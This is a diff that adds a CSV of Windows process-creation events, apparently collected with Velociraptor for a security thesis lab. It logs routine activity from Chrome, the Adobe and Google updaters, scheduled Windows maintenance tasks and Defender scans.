@@ -1,0 +1,409 @@
+_ts,Timestamp,PPID,PID,Name,CommandLine,ParentCommandLine,CallChain,ClientId
+1783856634768,2026-07-12T11:41:26Z,5276,6560,powershell.exe,,"""C:\Users\seguridad\Desktop\TFM\Velociraptor\velociraptor-v0.75.6-windows-amd64.exe""  --config server.config.yaml gui",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:27Z,7244,9740,msiexec.exe,C:\Windows\System32\MsiExec.exe -Embedding 3FBF9DADE6B43B6DCC443934BE572A93,C:\Windows\system32\msiexec.exe /V,wininit.exe <- services.exe <- msiexec.exe <- msiexec.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:29Z,9348,6856,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:34Z,772,8360,svchost.exe,C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:34Z,1320,10060,taskhostw.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:43Z,4172,7108,AdobeARMHelper.exe,,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\armsvc.exe""",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:43Z,10484,7296,AdobeARM_UCB.exe,,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe""",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:44Z,7108,2540,AdobeARM.exe,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"" /ArmElevate /MODE:3 /UpdateSelection:0 /PRODUCT:Acrobat /VERSION:26.0 /LANG:ENU /Svc /USER:SYSTEM /SESSIONID:1",,AdobeARM.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:45Z,2540,9276,AdobeARM.exe,,"""C:\Program Files (x86)\Common Files\Adobe\ARM\1.0\AdobeARM.exe"" /ArmElevate /MODE:3 /UpdateSelection:0 /PRODUCT:Acrobat /VERSION:26.0 /LANG:ENU /Svc /USER:SYSTEM /SESSIONID:1",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:49Z,7244,2776,msiexec.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:58Z,772,5452,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:41:58Z,5452,4048,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:01Z,772,4764,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:01Z,4764,3952,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:01Z,772,3500,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:02Z,3500,1272,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:02Z,772,3612,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:02Z,3612,6216,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:02Z,772,2100,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:02Z,2100,10552,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:03Z,772,11096,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:03Z,11096,296,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:04Z,772,788,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:04Z,788,5080,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:06Z,772,2884,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:06Z,2884,5196,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:08Z,772,9436,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:08Z,9436,4944,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:09Z,772,2360,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:10Z,2360,6156,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:13Z,772,8216,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:13Z,8216,6700,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:16Z,772,7356,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:16Z,7356,9484,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:16Z,9348,6460,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:16Z,9348,8792,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:16Z,9348,6104,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:18Z,772,5656,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:18Z,5656,9856,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:21Z,7244,9612,MSICFC6.tmp,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:21Z,772,6708,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:21Z,6708,6628,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:21Z,772,6872,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:21Z,6872,3500,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:22Z,9348,1460,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:22Z,9348,7268,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:22Z,9348,6196,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:24Z,9348,1452,chrome.exe,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --type=utility --utility-sub-type=on_device_model.mojom.OnDeviceModelService --lang=es --service-sandbox-type=on_device_model_execution --no-pre-read-main-dll --metrics-shmem-handle=6452,i,8883037612423066432,11842018139881767478,524288 --field-trial-handle=1992,i,15883667373147678976,5585095587974020185,262144 --variations-seed-version --pseudonymization-salt-handle=1996,i,15414328641234855124,13154617930620137814,4 --trace-process-track-uuid=3190709027541712850 --mojo-platform-channel-handle=6860 /prefetch:8","""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",chrome.exe <- chrome.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:25Z,772,5964,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:25Z,5964,8008,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:25Z,772,7984,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:25Z,7984,3996,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:31Z,772,8988,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:31Z,9348,5232,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:31Z,8988,8860,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:31Z,9348,4104,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:31Z,9348,9472,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:35Z,772,9128,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:35Z,9128,7384,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:38Z,9348,6132,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:38Z,9348,8716,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:38Z,9348,11064,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:41Z,772,10944,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:41Z,10944,6700,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:43Z,772,1924,updater.exe,"""C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\updater.exe"" --system --windows-service --service=update",C:\Windows\system32\services.exe,wininit.exe <- services.exe <- updater.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:43Z,1924,8388,updater.exe,"""C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\updater.exe"" --crash-handler --system ""--database=C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\Crashpad"" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=151.0.7910.0 ""--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log"" ""--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater_history.jsonl"" --initial-client-data=0x24c,0x250,0x254,0x248,0x258,0x7ff649df1270,0x7ff649df1280,0x7ff649df1290","""C:\Program Files (x86)\Google\GoogleUpdater\151.0.7910.0\updater.exe"" --system --windows-service --service=update",wininit.exe <- services.exe <- updater.exe <- updater.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:46Z,772,9700,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:46Z,9700,6060,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:47Z,772,10852,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:47Z,10852,3952,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:50Z,772,1752,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:50Z,1752,4084,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:51Z,9348,10132,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:51Z,9348,10440,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:53Z,904,6196,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:53Z,772,9964,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:53Z,9964,3736,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:55Z,772,9736,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:55Z,9736,2244,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:58Z,772,9488,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:42:58Z,9488,7620,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:01Z,772,3288,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:01Z,3288,1064,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:02Z,2776,8692,AdobeCollabSync.exe,,C:\Windows\System32\MsiExec.exe -Embedding 0E0F3D32320DCF408FD6A42AA9EC7A32 E Global\MSI0000,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:06Z,772,10732,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:06Z,10732,2360,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:12Z,772,10164,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:12Z,10164,8580,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:16Z,7244,4956,CPInstCU.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:16Z,7244,4004,SingleClientServicesUpdater.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:16Z,7244,5956,msiexec.exe,,C:\Windows\system32\msiexec.exe /V,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:17Z,772,9484,updater.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:17Z,9484,8388,updater.exe,,,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:30Z,1320,6176,taskhostw.exe,taskhostw.exe -RegisterUserDevice -NewAccount,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:32Z,1320,10336,taskhostw.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:32Z,772,8592,TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- TrustedInstaller.exe,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:33Z,904,3128,TiWorker.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
+1783856634768,2026-07-12T11:43:42Z,4004,4312,SingleClientServicesUpdater.exe,,"""C:\Program Files\Adobe\Acrobat DC\Acrobat\AcroCEF\SingleClientServicesUpdater.exe"" 26.001.21691  --SingleClientApp",Null,C.364907172793f8c7
+1783856746353,2026-07-12T11:43:55Z,2540,3144,AdobeARM.exe,,,Null,C.364907172793f8c7
+1783856746353,2026-07-12T11:43:55Z,2540,7004,AdobeARM.exe,,,Null,C.364907172793f8c7
+1783856746353,2026-07-12T11:44:22Z,1320,6764,dmclient.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856746353,2026-07-12T11:44:22Z,6764,8344,conhost.exe,,,Null,C.364907172793f8c7
+1783856746353,2026-07-12T11:44:39Z,6740,8692,NvSHIM.exe,"""C:\Program Files\NVIDIA Corporation\NvBackend\NvSHIM.exe"" /noheader -o ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.xml"" -l ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.log""","""C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe"" -f ""C:\ProgramData\NVIDIA\NvContainerUser%d.log"" -d ""C:\Program Files\NVIDIA Corporation\NvContainer\plugins\User"" -r -l 3 -p 30000 -st ""C:\Program Files\NVIDIA Corporation\NvContainer\NvContainerTelemetryApi.dll"" -c",wininit.exe <- services.exe <- nvcontainer.exe <- nvcontainer.exe <- NvSHIM.exe,C.364907172793f8c7
+1783856746353,2026-07-12T11:44:39Z,8692,9820,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Program Files\NVIDIA Corporation\NvBackend\NvSHIM.exe"" /noheader -o ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.xml"" -l ""C:\Users\seguridad\AppData\Local\NVIDIA\NvBackend\shim.log""",wininit.exe <- services.exe <- nvcontainer.exe <- nvcontainer.exe <- NvSHIM.exe <- conhost.exe,C.364907172793f8c7
+1783856746353,2026-07-12T11:44:41Z,904,10108,WmiPrvSE.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
+1783856746353,2026-07-12T11:44:41Z,772,8724,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:47Z,1320,7320,provtool.exe,"""C:\Windows\system32\ProvTool.exe"" /turn 5 /source LogonIdleTask",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- provtool.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:47Z,1320,9220,taskhostw.exe,taskhostw.exe Install $(Arg0),C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:47Z,772,9532,sppsvc.exe,C:\Windows\system32\sppsvc.exe,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- sppsvc.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:47Z,1320,1196,SpeechModelDownload.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:47Z,1320,10820,taskhostw.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:47Z,772,8000,TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- TrustedInstaller.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,904,5732,TiWorker.exe,C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.19041.3385_none_7e1c800a7c81ffd9\TiWorker.exe -Embedding,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- TiWorker.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,772,4632,svchost.exe,C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,1088,7556,UsoClient.exe,,C:\Windows\System32\mousocoreworker.exe -Embedding,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,1320,5440,taskhostw.exe,taskhostw.exe PiSqmTasks,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,1320,5088,SecureBootEncodeUEFI.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,1320,11188,taskhostw.exe,taskhostw.exe VerifyWinRE,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,772,9320,svchost.exe,C:\Windows\System32\svchost.exe -k wsappx -p -s ClipSVC,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,1320,10112,FaceFodUninstaller.exe,"""C:\Windows\System32\WinBioPlugIns\FaceFodUninstaller.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- FaceFodUninstaller.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,5088,7064,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:48Z,772,7004,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s DsmSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,7296,tzsync.exe,"""C:\Windows\system32\tzsync.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- tzsync.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,1780,rundll32.exe,"""C:\Windows\system32\rundll32.exe"" Windows.Storage.ApplicationData.dll,CleanupTemporaryState",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- rundll32.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,904,7912,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{722D0F89-B69C-4700-AE8C-4A44350E4876},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,8640,taskhostw.exe,taskhostw.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,8404,UsoClient.exe,"""C:\Windows\system32\usoclient.exe"" ReportPolicies",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- UsoClient.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,4960,rundll32.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,7296,7420,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\tzsync.exe""",wininit.exe <- services.exe <- svchost.exe <- tzsync.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,324,lpremove.exe,"""C:\Windows\system32\lpremove.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- lpremove.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,6004,MpCmdRun.exe,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,3192,MpCmdRun.exe,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" -IdleTask -TaskName WdCacheMaintenance",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,324,3648,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\lpremove.exe""",wininit.exe <- services.exe <- svchost.exe <- lpremove.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,3192,10792,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" -IdleTask -TaskName WdCacheMaintenance",wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,6004,5656,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26050.15-0\MpCmdRun.exe"" Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob",wininit.exe <- services.exe <- svchost.exe <- MpCmdRun.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,772,9252,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s wisvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,6764,sc.exe,"""C:\Windows\system32\sc.exe"" start w32time task_started",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- sc.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,9048,rundll32.exe,"""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- rundll32.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,2316,CompatTelRunner.exe,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- CompatTelRunner.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,5496,dmclient.exe,"""C:\Windows\system32\dmclient.exe""",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- dmclient.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,2316,320,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",wininit.exe <- services.exe <- svchost.exe <- CompatTelRunner.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,5496,9004,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\dmclient.exe""",wininit.exe <- services.exe <- svchost.exe <- dmclient.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,6764,9868,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\sc.exe"" start w32time task_started",wininit.exe <- services.exe <- svchost.exe <- sc.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,1320,7992,DiskSnapshot.exe,"""C:\Windows\system32\disksnapshot.exe"" -z",C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,wininit.exe <- services.exe <- svchost.exe <- DiskSnapshot.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:49Z,7992,6108,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,"""C:\Windows\system32\disksnapshot.exe"" -z",wininit.exe <- services.exe <- svchost.exe <- DiskSnapshot.exe <- conhost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:50Z,1320,11252,dstokenclean.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:50Z,11252,2680,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:50Z,772,9968,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:52Z,904,6100,sdiagnhost.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
